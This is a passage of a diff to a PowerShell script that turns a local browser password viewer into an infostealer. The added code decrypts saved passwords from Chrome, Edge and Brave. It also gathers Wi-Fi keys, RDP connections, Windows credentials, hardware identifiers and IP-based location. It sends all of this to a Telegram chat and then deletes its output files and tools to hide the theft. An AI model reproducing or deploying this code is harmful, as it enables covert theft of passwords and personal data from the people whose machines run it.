+                Write-Host "    Profile $profileName: $successfulDecryptions/$counter passwords successfully decrypted" -ForegroundColor Green
+                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
+            }
+            
+            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
+            
+        } catch {
+            Write-Host "    Error processing $BrowserName profile $($profileName): $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+    
+    return $decryptedPasswords
 }
 
 # Main execution
-Write-Host "🚀 Browser Password Extractor - PowerShell Edition" -ForegroundColor Magenta
-Write-Host "⚠️  Make sure browsers are closed for best results!" -ForegroundColor Yellow
-Write-Host ""
+Write-Host "Enhanced Browser and Network Password Extraction with Decryption" -ForegroundColor Green
+Write-Host "===============================================================" -ForegroundColor Green
 
-try {
-    Get-BrowserPasswords
-} catch {
-    Write-Host "❌ Critical error: $($_.Exception.Message)" -ForegroundColor Red
+# Get system and location information
+$systemInfo = Get-DetailedSystemInfo
+$ipInfo = Get-PublicIPInfo
+$timestamp = Get-Date -Format "ddMMyyyy"
+$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
+
+# Create file names with the new format
+$browserFilePrefix = "Browser_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
+$networkFilePrefix = "Network_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
+
+$BrowserJSONPath = Join-Path $PWD "${browserFilePrefix}.json"
+$NetworkJSONPath = Join-Path $PWD "${networkFilePrefix}.json"
+
+Write-Host "Location Info:" -ForegroundColor Yellow
+Write-Host "Public IP: $($ipInfo.PublicIP)" -ForegroundColor Cyan
+Write-Host "Country: $($ipInfo.Country)" -ForegroundColor Cyan
+Write-Host "Region: $($ipInfo.Region)" -ForegroundColor Cyan
+Write-Host "City: $($ipInfo.City)" -ForegroundColor Cyan
+Write-Host "Files will be saved as:" -ForegroundColor Yellow
+Write-Host "Browser JSON: $BrowserJSONPath" -ForegroundColor Yellow
+Write-Host "Network JSON: $NetworkJSONPath" -ForegroundColor Yellow
+Write-Host "Telegram Chat ID: $y" -ForegroundColor Cyan
+
+# Browser paths configuration
+$browsers = @{
+    "Chrome" = @{
+        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        Name = "Google Chrome"
+    }
+    "Edge" = @{
+        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        Name = "Microsoft Edge"
+    }
+    "Brave" = @{
+        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+        Name = "Brave Browser"
+    }
 }
 
-Write-Host ""
-Write-Host "Press any key to exit..." -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# Send system information to Telegram first
+$systemMessage = @"
+🖥️ <b>System Information</b>
+• <b>Computer:</b> $($systemInfo.ComputerName)
+• <b>User:</b> $($systemInfo.UserName)
+• <b>OS:</b> $($systemInfo.OSName) ($($systemInfo.OSVersion))
+• <b>Processor:</b> $($systemInfo.Processor) ($($systemInfo.ProcessorCores) cores)
+• <b>Memory:</b> $($systemInfo.TotalMemoryGB) GB
+• <b>Manufacturer:</b> $($systemInfo.SystemManufacturer)
+• <b>Model:</b> $($systemInfo.SystemModel)
+• <b>BIOS Serial:</b> $($systemInfo.BIOSSerial)
+• <b>Local IP:</b> $($systemInfo.LocalIP)
+• <b>MAC Address:</b> $($systemInfo.MACAddress)
 
+🌍 <b>Location Information</b>
+• <b>Public IP:</b> $($ipInfo.PublicIP)
+• <b>Country:</b> $($ipInfo.Country)
+• <b>Region:</b> $($ipInfo.Region)
+• <b>City:</b> $($ipInfo.City)
+• <b>Organization:</b> $($ipInfo.Org)
+• <b>Coordinates:</b> $($ipInfo.Loc)
+• <b>Timezone:</b> $($ipInfo.Timezone)
+
+⏰ <b>Extraction Started:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+
+Write-Host "Sending system information to Telegram..." -ForegroundColor Yellow
+Send-TelegramMessage -Message $systemMessage | Out-Null
+
+# Extract detailed WiFi information
+Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
+$wifiData = Get-DetailedWiFiInfo
+
+# Extract RDP connections
+Write-Host "Extracting RDP connections..." -ForegroundColor Yellow
+$rdpConnections = Get-RDPConnections
+
+# Extract Windows network credentials
+Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
+$networkCredentials = Get-WindowsNetworkCredentials
+
+# Combine all network data
+$networkData = @{
+    WiFi = $wifiData
+    RDPConnections = $rdpConnections
+    WindowsCredentials = $networkCredentials
+    Metadata = @{
+        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        OS = $systemInfo.OSName
+        OSVersion = $systemInfo.OSVersion
+        User = $systemInfo.UserName
+        Machine = $systemInfo.ComputerName
+        PublicIP = $ipInfo.PublicIP
+        Country = $ipInfo.Country
+        Region = $ipInfo.Region
+        City = $ipInfo.City
+        Org = $ipInfo.Org
+        Loc = $ipInfo.Loc
+        Timezone = $ipInfo.Timezone
+        SystemName = $systemInfo.ComputerName
+    }
+}
+
+# Export network data to JSON
+$networkData | ConvertTo-Json -Depth 10 | Out-File -FilePath $NetworkJSONPath -Encoding UTF8
+Write-Host "Network data exported to: $NetworkJSONPath" -ForegroundColor Green
+
+# Install SQLite if needed
+if (-not (Test-Path ".\sqlite3.exe")) {
+    if (-not (Install-SQLiteIfNeeded)) {
+        Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
+        exit 1
+    }
+}
+
+# Extract and decrypt browser passwords
+$allDecryptedPasswords = @()
+
+# Process each browser
+foreach ($browserKey in $browsers.Keys) {
+    $browser = $browsers[$browserKey]
+    Write-Host "`nProcessing $($browser.Name)..." -ForegroundColor Yellow
+    
+    # Extract and decrypt passwords
+    $decryptedPasswords = Get-DecryptedBrowserPasswords -BrowserDataPath $browser.Path -BrowserName $browser.Name
+    $allDecryptedPasswords += $decryptedPasswords
+    
+    Write-Host "Finished processing $($browser.Name): $($decryptedPasswords.Count) passwords decrypted" -ForegroundColor Green
+}
+
+# Display and export results
+if ($allDecryptedPasswords.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
+    Write-Host "`nSuccessfully extracted and decrypted data!" -ForegroundColor Green
+    
+    if ($allDecryptedPasswords.Count -gt 0) {
+        Write-Host "Decrypted browser passwords: $($allDecryptedPasswords.Count) entries" -ForegroundColor Green
+        
+        # Show sample of decrypted passwords
+        Write-Host "`nSample of decrypted passwords:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt [Math]::Min($allDecryptedPasswords.Count, 5); $i++) {
+            $pwd = $allDecryptedPasswords[$i]
+            Write-Host "  $($i+1). $($pwd.URL)" -ForegroundColor White
+            Write-Host "      Username: $($pwd.Username)" -ForegroundColor Gray
+            Write-Host "      Password: $($pwd.Password)" -ForegroundColor Green
+            Write-Host ""
+        }
+        
+        # Export decrypted data to JSON
+        try {
+            $exportData = @{
+                Metadata = @{
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    TotalDecryptedPasswords = $allDecryptedPasswords.Count
+                    OS = $systemInfo.OSName
+                    OSVersion = $systemInfo.OSVersion
+                    User = $systemInfo.UserName
+                    Machine = $systemInfo.ComputerName
+                    PublicIP = $ipInfo.PublicIP
+                    Country = $ipInfo.Country
+                    Region = $ipInfo.Region
+                    City = $ipInfo.City
+                    Org = $ipInfo.Org
+                    Loc = $ipInfo.Loc
+                    Timezone = $ipInfo.Timezone
+                    SystemName = $systemInfo.ComputerName
+                }
+                DecryptedPasswords = $allDecryptedPasswords
+            }
+            
+            $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $BrowserJSONPath -Encoding UTF8
+            Write-Host "Decrypted browser data exported to: $BrowserJSONPath" -ForegroundColor Green
+            
+        } catch {
+            Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+    
+    if ($wifiData.Profiles.Count -gt 0) {
+        Write-Host "WiFi passwords: $($wifiData.Profiles.Count) networks found" -ForegroundColor Green
+    }
+    
+    if ($networkCredentials.Count -gt 0) {
+        Write-Host "Windows network credentials: $($networkCredentials.Count) entries found" -ForegroundColor Green
+    }
+    
+    if ($rdpConnections.Count -gt 0) {
+        Write-Host "RDP connections: $($rdpConnections.Count) entries found" -ForegroundColor Green
+    }
+    
+    # Wait to ensure files are fully written
+    Write-Host "Waiting for files to be fully written..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 5
+    
+    # Send files to Telegram
+    Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
+    
+    $filesSent = 0
+    $totalFiles = 0
+    
+    if ($allDecryptedPasswords.Count -gt 0) {
+        $totalFiles += 1
+        $browserCaption = "✅ Decrypted Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nPasswords: $($allDecryptedPasswords.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
+    }
+    
+    if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
+        $totalFiles += 1
+        $networkCaption = "🌐 Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nRDP Connections: $($rdpConnections.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        if (Send-TelegramFile -FilePath $NetworkJSONPath -Caption $networkCaption) { $filesSent++ }
+    }
+    
+    # Send completion message
+    $completionMessage = @"
+✅ <b>Extraction and Decryption Completed Successfully!</b>
+
+🖥️ <b>System:</b> $($systemInfo.ComputerName)
+🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
+🔓 <b>Decrypted Passwords:</b> $($allDecryptedPasswords.Count)
+📶 <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
+🔐 <b>Windows Credentials:</b> $($networkCredentials.Count)
+🖥️ <b>RDP Connections:</b> $($rdpConnections.Count)
+📁 <b>Files Sent:</b> $filesSent/$totalFiles
+⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+    
+    Send-TelegramMessage -Message $completionMessage | Out-Null
+    
+    if ($filesSent -eq $totalFiles) {
+        Write-Host "✅ All files sent to Telegram successfully!" -ForegroundColor Green
+    } else {
+        Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
+    }
+    
+} else {
+    Write-Host "No data found in any browser or network credentials." -ForegroundColor Yellow
+    $emptyMessage = "❌ No passwords found in any browser or network credentials.`nSystem: $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Send-TelegramMessage -Message $emptyMessage | Out-Null
+}
+
+Write-Host "`nEnhanced password extraction and decryption completed." -ForegroundColor Green
+
+# Cleanup all files
+Write-Host "Cleaning up all files..." -ForegroundColor Yellow
+
+# Cleanup temporary files
+Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
+Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force
+
+# Cleanup SQLite
+if (Test-Path ".\sqlite3.exe") {
+    Remove-Item ".\sqlite3.exe" -Force -ErrorAction SilentlyContinue
+}
+
+# Cleanup JSON files after sending to Telegram
+if (Test-Path $BrowserJSONPath) {
+    Remove-Item $BrowserJSONPath -Force -ErrorAction SilentlyContinue
+}
+
+if (Test-Path $NetworkJSONPath) {
+    Remove-Item $NetworkJSONPath -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "All files cleaned up." -ForegroundColor Green
